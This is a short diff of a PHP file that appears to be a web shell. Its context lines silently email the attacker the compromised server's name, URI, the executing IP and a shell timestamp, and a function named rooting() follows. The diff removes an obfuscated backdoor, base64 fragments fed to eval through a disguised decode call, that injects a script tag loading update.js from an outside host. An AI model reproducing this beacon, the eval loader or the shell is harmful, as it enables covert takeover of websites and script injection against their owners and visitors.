@@ -4699,11 +4699,6 @@ $server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_H
 $linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
 $header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
 @mail($to_email, $server_mail, $linkcr, $header);
-
-$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL2luam";
-$winr = "VjdDByLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=";
-$min = 'base' . (128 / 2) . '_de' . 'code';
-eval($min($linr . $winr));
  ?>
 <?php
 function rooting()
